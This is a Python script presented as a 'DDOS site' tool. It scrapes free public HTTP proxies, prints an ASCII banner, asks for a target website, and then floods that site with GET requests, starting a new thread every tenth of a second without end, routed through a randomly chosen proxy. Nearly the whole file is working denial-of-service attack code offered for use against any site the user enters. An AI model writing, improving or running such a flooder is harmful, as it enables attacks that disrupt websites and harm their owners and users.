import requests
import threading
import random
import time
from colorama import Fore
from colorama import init
init(autoreset=True)



def scrape():
    scraped = 0
    f = open("proxies.txt", "a+")
    f.truncate(0)
    r = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1500&ssl=yes')
    proxies = []
    for proxy in r.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
            proxies.append(proxy)
    for p in proxies:
        scraped = scraped + 1 
        f.write((p)+"\n")
    f.close()
scrape()





print(Fore.RED + """\
▓█████▄ ▓█████▄  ▒█████  ▒██   ██▒     ██████  ██▓▄▄▄█████▓▓█████ 
▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒▒ █ █ ▒░   ▒██    ▒ ▓██▒▓  ██▒ ▓▒▓█   ▀ 
░██   █▌░██   █▌▒██░  ██▒░░  █   ░   ░ ▓██▄   ▒██▒▒ ▓██░ ▒░▒███   
░▓█▄   ▌░▓█▄   ▌▒██   ██░ ░ █ █ ▒      ▒   ██▒░██░░ ▓██▓ ░ ▒▓█  ▄ 
░▒████▓ ░▒████▓ ░ ████▓▒░▒██▒ ▒██▒   ▒██████▒▒░██░  ▒██▒ ░ ░▒████▒
 ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒▒ ░ ░▓ ░   ▒ ▒▓▒ ▒ ░░▓    ▒ ░░   ░░ ▒░ ░
 ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░░   ░▒ ░   ░ ░▒  ░ ░ ▒ ░    ░     ░ ░  ░
 ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒   ░    ░     ░  ░  ░   ▒ ░  ░         ░   
   ░       ░        ░ ░   ░    ░           ░   ░              ░  ░
 ░       ░                                                        """)

site = input("Enter site to ddox: ")

proxy = set()

with open("proxies.txt", "r") as f:
    file_lines1 = f.readlines()
    for line1 in file_lines1:
        proxy.add(line1.strip())
        
proxies = {
    'https': random.choice(list(proxy))
}


def sendRequest():
	req = requests.get(site, proxies=proxies)
	if req.status_code == 200:
		print("ddox sent ")
	else:
		print("ddox fail :( {req.status_code} ")
    

def hacker():
	while True:
		thread = threading.Thread(target=sendRequest, daemon=True)
		thread.start()
		time.sleep(0.1)
        
       
	   


hacker()

